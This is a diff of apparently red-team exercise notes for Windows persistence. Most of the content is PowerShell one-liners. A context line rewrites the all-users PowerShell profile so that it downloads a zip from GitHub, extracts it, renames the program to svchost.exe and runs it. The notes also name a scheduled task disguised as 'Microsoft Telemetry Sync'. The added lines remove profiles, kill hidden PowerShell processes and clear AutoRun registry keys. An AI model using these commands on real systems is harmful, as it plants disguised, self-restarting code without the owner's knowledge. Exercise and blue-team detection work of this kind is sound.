@@ -33,6 +33,9 @@ Blueteamer can find reg key by checking:
 (Additional persistence) Create powershell profile (Have to change user from Administrator to whatever):
 $p='C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'; New-Item $p -Force; '$g="$env:LOCALAPPDATA\Blueteeth\GooseTest-main\svchost.exe"; if(test-path $g){start $g}else{start-job {iwr "https://github.com/Berto1019/GooseTest/archive/refs/heads/main.zip" -outf "$env:temp\g.zip";expand "$env:temp\g.zip" -dest "$env:LOCALAPPDATA\Blueteeth" -f;ren "$env:LOCALAPPDATA\Blueteeth\GooseTest-main\GooseDesktop.exe" "svchost.exe"}}' | out-file $p -enc ascii -force
 
+Remove profile and force back to original:
+"CurrentUserCurrentHost", "CurrentUserAllHosts", "AllUsersCurrentHost", "AllUsersAllHosts" | ForEach-Object { if (Test-Path $PROFILE.$_) { Remove-Item $PROFILE.$_ -Force } }; Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "" -and $_.Id -ne $PID } | Stop-Process -Force; "HKCU:\Software\Microsoft\Command Processor", "HKLM:\Software\Microsoft\Command Processor" | Remove-ItemProperty -Name "AutoRun" -ErrorAction SilentlyContinue
+
 Unregister Scheduled Task
 Unregister-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Confirm:$false
 
